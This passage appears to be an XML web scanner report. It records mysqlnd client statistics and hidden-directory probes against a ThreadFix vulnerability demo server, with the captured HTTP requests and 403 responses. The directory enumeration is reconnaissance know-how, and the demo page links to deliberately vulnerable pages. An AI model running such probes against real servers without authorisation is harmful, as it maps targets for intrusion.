&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Client statistics&lt;/th&gt;&lt;th&gt; &lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_sent &lt;/td&gt;&lt;td class="v"&gt;53655 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received &lt;/td&gt;&lt;td class="v"&gt;112893 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_sent &lt;/td&gt;&lt;td class="v"&gt;3054 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received &lt;/td&gt;&lt;td class="v"&gt;3445 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;protocol_overhead_in &lt;/td&gt;&lt;td class="v"&gt;13780 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;protocol_overhead_out &lt;/td&gt;&lt;td class="v"&gt;12216 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_ok_packet &lt;/td&gt;&lt;td class="v"&gt;4708 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_eof_packet &lt;/td&gt;&lt;td class="v"&gt;6480 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_rset_header_packet &lt;/td&gt;&lt;td class="v"&gt;4820 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_rset_field_meta_packet &lt;/td&gt;&lt;td class="v"&gt;55583 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_rset_row_packet &lt;/td&gt;&lt;td class="v"&gt;11517 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_prepare_response_packet &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bytes_received_change_user_packet &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_sent_command &lt;/td&gt;&lt;td class="v"&gt;1167 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_ok &lt;/td&gt;&lt;td class="v"&gt;428 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_eof &lt;/td&gt;&lt;td class="v"&gt;720 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_rset_header &lt;/td&gt;&lt;td class="v"&gt;360 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_rset_field_meta &lt;/td&gt;&lt;td class="v"&gt;1023 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_rset_row &lt;/td&gt;&lt;td class="v"&gt;554 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_prepare_response &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;packets_received_change_user &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;result_set_queries &lt;/td&gt;&lt;td class="v"&gt;341 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;non_result_set_queries &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;no_index_used &lt;/td&gt;&lt;td class="v"&gt;339 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;bad_index_used &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;slow_queries &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;buffered_sets &lt;/td&gt;&lt;td class="v"&gt;341 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;unbuffered_sets &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ps_buffered_sets &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ps_unbuffered_sets &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;flushed_normal_sets &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;flushed_ps_sets &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ps_prepared_never_executed &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ps_prepared_once_executed &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_server_normal &lt;/td&gt;&lt;td class="v"&gt;213 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_server_ps &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_buffered_from_client_normal &lt;/td&gt;&lt;td class="v"&gt;213 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_buffered_from_client_ps &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_client_normal_buffered &lt;/td&gt;&lt;td class="v"&gt;213 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_client_normal_unbuffered &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_client_ps_buffered &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_client_ps_unbuffered &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_fetched_from_client_ps_cursor &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_affected_normal &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_affected_ps &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_skipped_normal &lt;/td&gt;&lt;td class="v"&gt;213 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;rows_skipped_ps &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;copy_on_write_saved &lt;/td&gt;&lt;td class="v"&gt;639 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;copy_on_write_performed &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;command_buffer_too_small &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;connect_success &lt;/td&gt;&lt;td class="v"&gt;360 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;connect_failure &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;connection_reused &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;reconnect &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;pconnect_success &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;active_connections &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;active_persistent_connections &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;explicit_close &lt;/td&gt;&lt;td class="v"&gt;360 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;implicit_close &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;disconnect_close &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;in_middle_of_command_close &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;explicit_free_result &lt;/td&gt;&lt;td class="v"&gt;341 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;implicit_free_result &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;explicit_stmt_close &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;implicit_stmt_close &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_emalloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_emalloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_ecalloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_ecalloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_erealloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_erealloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_efree_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_efree_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_malloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_malloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_calloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_calloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_realloc_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_realloc_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_free_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_free_amount &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_estrndup_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_strndup_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_estndup_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mem_strdup_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_null &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_bit &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_tinyint &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_short &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_int24 &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_int &lt;/td&gt;&lt;td class="v"&gt;213 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_bigint &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_decimal &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_float &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_double &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_date &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_year &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_time &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_datetime &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_timestamp &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_string &lt;/td&gt;&lt;td class="v"&gt;426 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_blob &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_enum &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_set &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_geometry &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_text_fetched_other &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_null &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_bit &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_tinyint &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_short &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_int24 &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_int &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_bigint &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_decimal &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_float &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_double &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_date &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_year &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_time &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_datetime &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_timestamp &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_string &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_blob &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_enum &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_set &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_geometry &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;proto_binary_fetched_other &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;init_command_executed_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;init_command_failed_count &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_quit &lt;/td&gt;&lt;td class="v"&gt;360 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_init_db &lt;/td&gt;&lt;td class="v"&gt;68 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_query &lt;/td&gt;&lt;td class="v"&gt;360 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_field_list &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_create_db &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_drop_db &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_refresh &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;com_shutdown &lt;/td&gt;&lt;td ...
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/aux/</Url>
        <Entity />
        <Variant ID="3070">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /aux/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="141" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /aux/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 206
Date: Mon, 14 Jul 2014 14:45:37 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /aux/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/cgi-bin/</Url>
        <Entity />
        <Variant ID="3111">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /cgi-bin/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="145" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /cgi-bin/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 210
Date: Mon, 14 Jul 2014 14:45:37 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /cgi-bin/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/com1/</Url>
        <Entity />
        <Variant ID="3131">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /com1/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="142" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

